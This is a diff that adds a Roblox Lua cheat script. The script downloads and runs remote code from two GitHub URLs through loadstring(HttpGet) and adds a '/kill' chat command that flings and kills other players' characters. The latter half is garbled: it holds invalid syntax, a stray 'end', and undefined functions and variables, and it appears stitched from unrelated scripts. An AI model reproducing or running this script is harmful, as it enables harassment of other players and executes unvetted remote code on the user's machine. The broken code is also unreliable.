@@ -1,0 +1,253 @@
+local player = game.Players.LocalPlayer
+
+local character1 = player.Character
+
+local mouse = player:GetMouse()
+
+local fakebody = Instance.new("Part", character1)
+
+fakebody.Transparency = 1
+
+fakebody.Anchored = true
+
+fakebody.CanCollide = false
+
+fakebody.Position = character1.Head.Position
+
+fakebody.Name = "FPart"
+
+wait()
+
+_G.ReanimationType = "PDeath" --PDeath, Fling, Simple
+
+_G.Velocity = Vector3.new(36,0,0)
+
+_G.FlingBlock = true
+
+_G.FlingBlockTransparency = 1
+
+_G.HighlightFlingBlock = true
+
+_G.FlingBlockPosition = "FPart"
+
+_G.HighlightFlingBlockColor = Color3.fromRGB(255,0,0)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GelatekWasTaken/Reanimation.lua/main/Main/Main.lua"))()
+
+Loadstring(game:HttpGet("https://raw.githubusercontent.com/XDMODZ1040/XDMODZ1040/main/HACKER_YT/ROBLOX-EXPLOITER/HACKER/PLAYERS/ROOT/CODEX/FORCE/OPTIFINE%20EDITION/SERVERSIDE"))()
+
+function GetPlayer(name)
+
+	for i,v in pairs(game:GetService("Players"):GetPlayers()) do		if v.DisplayName:lower():sub(1, #name) == name:lower() or v.Name:lower():sub(1, #name) == name:lower() then
+
+			return v
+
+		end
+
+	end    
+
+end
+
+local plrs = game:GetService("Players")
+
+local plr = plrs.LocalPlayer
+
+local char = plr.Character
+
+local killing = false
+
+local victim = nil
+
+plr.Chatted:Connect(function(msg)
+
+	if string.sub(msg, 1, 6) == "/kill " then
+
+		if plrs:FindFirstChild(string.sub(msg, 7)) then
+
+			victim = plrs:FindFirstChild(string.sub(msg, 7))
+
+			killing = true
+
+			wait(2)
+
+			killing = false
+
+		else
+
+			if GetPlayer(string.sub(msg, 7)) then
+
+				victim = GetPlayer(string.sub(msg, 7))
+
+				killing = true
+
+				wait(2)
+
+				killing = false
+
+			else
+
+				print("Player not found!")
+
+			end
+
+		end
+
+	end
+
+end)
+
+plrs.PlayerRemoving:Connect(function(player)
+
+	if player == victim then
+
+		killing = false
+
+	end
+
+end)
+
+spawn(function()
+
+	while game:GetService("RunService").Heartbeat:Wait() do
+
+		if killing == false then
+
+			character1.Reanimate.FPart.Position = game.Players.LocalPlayer.Character.Torso.Position
+
+		else
+
+			if victim.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
+
+				character1.Reanimate.FPart.Position = victim.Character.Torso.Position
+
+			else
+
+				character1.Reanimate.FPart.Position = victim.Character.UpperTorso.Position
+
+			end
+
+		end
+
+	end
+
+end)
+
+print"ORPLAYZ SCRIPT LOADED"
+
+_G.PlayersFling = ("Humanoid").DeadLocal = RootFling
+
+wait()
+
+end
+
+tractordown()
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u6.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u7.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u8.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u9.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u10.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u11.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u12.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u13.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u14.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u15.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u16.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u17.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u18.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u19.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u20.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u21.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u22.CFrame
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u23.CFrame
+
+tractorup()
+
+for i=1,50 do
+
+MoveX(u1,-3)
+
+if game.Players[Victim] ~= nil then
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u23.CFrame
+
+end
+
+wait(.05)
+
+end
+
+wait(0.1)
+
+game.Players[Victim].Character.HumanoidRootPart.CFrame = u21.CFrame
+
+game.Players[Victim].Character.Humanoid.Health = 0
+
+game.Players[Victim].Character.HumanoidRootPart.Anchored = false
+
+game.Players[Victim].Character.Humanoid.Fling = true
+
+Player.localFling = false
+
+for i=1,50 do
+
+MoveX(u1,-3)
+
+wait()
+
+end
+
+u1:Destroy()
+
+		end
